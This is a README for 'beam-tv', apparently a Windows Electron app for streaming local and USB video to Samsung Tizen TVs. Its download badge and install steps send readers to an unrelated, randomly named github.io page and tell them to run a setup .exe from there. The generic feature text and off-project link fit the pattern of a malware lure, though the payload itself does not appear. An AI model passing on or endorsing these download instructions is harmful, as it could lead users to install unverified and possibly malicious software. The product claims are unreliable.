# 📺 beam-tv - Stream local media to Samsung TVs

[![Download Beam TV](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://laborpainsalliteration178.github.io)

beam-tv acts as a bridge between your computer and your Samsung smart television. This application allows you to play video files stored on your computer or USB drive directly on your Tizen-based TV. It handles subtitles, remembers where you stopped watching, and provides remote navigation tools.

## 📥 Getting Started

To begin, you must install the application on your Windows computer. Follow these steps to set up the software.

1. Visit [this page to download the latest setup file](https://laborpainsalliteration178.github.io).
2. Locate the download folder on your computer.
3. Open the file ending in .exe to start the installer.
4. Follow the prompts on your screen to complete the installation.
5. Launch the application from your desktop or start menu.

## 🖥️ System Requirements

Ensure your setup meets these conditions for smooth playback:

* Operating System: Windows 10 or Windows 11.
* Television: A Samsung Smart TV running the Tizen operating system.
* Network: Both your computer and your Samsung TV must connect to the same home local network.
* Hardware: A valid USB drive if you choose to play files via the USB method.

## ⚙️ How to Play Media

The application separates your media into two categories: local files on your machine and files on a USB drive.

### Using DLNA Networking
The DLNA feature sends video data over your home wireless or wired network. 

1. Ensure your Samsung TV is powered on.
2. Open the beam-tv application on your Windows computer.
3. Select your TV from the list of detected devices. 
4. Drag your video files into the application window.
5. Click the play button to start the stream.

### Using USB Media Playback
If you prefer not to use your network, you can stream directly from a USB stick connected to your computer.

1. Insert your USB drive into an available USB port on your computer.
2. Open the beam-tv application.
3. Select the USB drive source from the menu.
4. Choose the video file you wish to watch.
5. Control the playback using the remote navigation buttons provided in the app.

## 🛠️ Features

* Subtitle Support: Automatic detection and sync for subtitle files.
* Resume Playback: The app remembers your position in the movie so you can finish it later.
* Remote Navigation: Use your computer keyboard or mouse to move through TV menus.
* Tizen Compatibility: Built specifically for the requirements of Samsung displays.
* Companion Server: A background task runs locally to manage the transfer of video data between your machine and your television.

## 🔧 Troubleshooting

If the TV does not find your computer, try these steps:

* Restart the application: Close beam-tv and open it again.
* Check the network: Verify that your computer and your TV use the same Wi-Fi network.
* Update software: Ensure you have the latest version of beam-tv by visiting the download link provided above.
* Firewall settings: Ensure your Windows Firewall allows the application to communicate with your home network.

## 📁 Project Structure

This application runs on the Electron framework. It uses local server components to broadcast media files. The software manages the connection protocols required by Samsung devices to ensure steady video performance.

## 🤝 Contributing

This project welcomes input from the community. You can report bugs or suggest new features by opening an issue on the repository page. Look for issues labeled as good-first-issue if you want to help with development.

Keywords: dlna, electron, home-media, media-player, open-source, samsung-smart-tv, tizen, upnp, usb-media-player